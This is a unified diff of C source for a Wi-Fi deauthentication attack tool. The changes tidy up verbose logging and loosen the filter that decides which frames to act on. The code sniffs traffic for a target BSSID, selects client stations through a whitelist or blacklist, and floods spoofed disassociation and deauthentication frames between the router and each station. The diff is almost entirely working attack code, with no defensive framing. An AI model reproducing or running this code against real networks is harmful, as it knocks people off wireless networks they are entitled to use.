@@ -171,10 +171,11 @@ struct packet create_deauth_frame(uchar *mac_destination, uchar *mac_source, uch
 
 int send_packet(uchar *buf, size_t count)
 {
-    printf("\nsending packet...");
     struct wif *wi = _wi_out; /* XXX */
+
     uchar* to_send = malloc(count);
     memcpy(to_send, buf, count);
+
     if (wi_write(wi, to_send, count, NULL) == -1) {
         switch (errno) {
         case EAGAIN:
@@ -192,12 +193,6 @@ int send_packet(uchar *buf, size_t count)
     }
 
     free(to_send);
-    printf("... DONE\n");
-    if (verbose)
-    {
-        printf("The sended packet itself: \n");
-        print_packet(buf, count);
-    }
     return 0;
 }
 
@@ -423,6 +418,7 @@ void run_deauth(uchar *bssid, int how_many)
     uchar * mac_station = NULL;
     struct packet result_packet;
     int counter = 0;
+
     while(1)
     {
         sniffed_packet_data = get_target_deauth(bssid);
@@ -432,53 +428,87 @@ void run_deauth(uchar *bssid, int how_many)
         if (
             (with_whitelist == 1 && is_in_list(mac_station)) ||
             (with_whitelist == 0 && !is_in_list(mac_station)) ||
-            (!memcmp(mac_station, mac_bssid, MAC_LENGTH)) ||
-            (sniffed_packet_data[1] & '\x01') ||                // ToDS
-            (sniffed_packet_data[1] & '\x02')                   // FromDS
+            (!memcmp(mac_station, mac_bssid, MAC_LENGTH))
         ) {
             continue;
         }
         break;
     }
-    printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
-    printf("Expected BSSID: ");
-    print_mac(bssid);
-    printf("\n---- Frame ----\n");
-    printf("BSSID: ");
-    print_mac(mac_bssid);
-    printf("mac_station: ");
-    print_mac(mac_station);
-    printf("mac_station is ");
-    if  (with_whitelist)
-    {
-        printf("not in whitelist.");
-    }
-    else
-    {
-        printf("in blacklist.");
-    }
-    if (verbose)
-    {
+
+    if (verbose) {
+        printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
+        printf("Expected BSSID: ");
+        print_mac(bssid);
+        printf("\n---- Frame ----\n");
+        printf("BSSID: ");
+        print_mac(mac_bssid);
+        printf("Station: ");
+        print_mac(mac_station);
+
+        if  (with_whitelist)
+        {
+            printf("The station mac is not in the whitelist.\n");
+        }
+        else
+        {
+            printf("The station mac is in the blacklist.\n");
+        }
+
         printf("The captured packet itself: \n");
         print_packet(sniffed_packet_data, MAX_PACKET_LENGTH);
     }
 
-    // dissasoc router -> station
     result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 1);
+
+    if (verbose)
+    {
+        printf("Disassociate router -> station: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
     for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-    // deauth router -> station
+
+    if (verbose) printf("%d packets send\n\n", how_many);
+
     result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 0);
+
+    if (verbose)
+    {
+        printf("Deauthenticate router -> station: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
     for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-    // dissasoc station -> router
+
+    if (verbose) printf("%d packets send\n\n", how_many);
+
     result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 1);
+
+    if (verbose)
+    {
+        printf("Disassociate station -> router: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
     for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-    // deauth station -> router
+
+    if (verbose) printf("%d packets send\n\n", how_many);
+
     result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 0);
+
+    if (verbose)
+    {
+        printf("Deauthenticate station -> router: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
     for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
+
+    if (verbose) printf("%d packets send\n\n    ", how_many);
 
     free(sniffed_packet_data);
 }
